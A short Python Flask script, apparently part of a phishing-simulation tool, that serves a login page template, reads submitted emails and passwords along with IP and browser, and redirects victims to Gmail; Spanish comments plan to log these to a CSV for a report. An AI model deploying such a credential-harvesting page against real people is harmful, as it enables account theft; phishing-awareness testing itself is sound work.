import sys
from flask import Flask, request, render_template, redirect

app = Flask(__name__)


@app.route('/', methods=['GET', 'POST'])
def phishing_server():
    target = sys.argv[1]
    if request.method == 'POST':
        email = request.form['email']
        passwd = request.form['password']
        ip_addr = request.remote_addr
        user_agent = request.user_agent

        # TODO: todos estos cmapos se vana  meter en un CSV.
        # este CSV va a contener ip, email, passw, navegador....
        # además una fase o stage, por ejemplo si se ha llegado hasta aqí es que el se ha saltado
        # varias protecciones... pues eso también hay que pònerlo para cuando se genere el informe.
        # redirect a donde toque
        return redirect("https://www.gmail.com", code=302)
    return render_template(target, name='index')

if __name__ == '__main__':
    app.run(host='0.0.0.0', port='80')
    # app.run(host='0.0.0.0', port='80')ddde
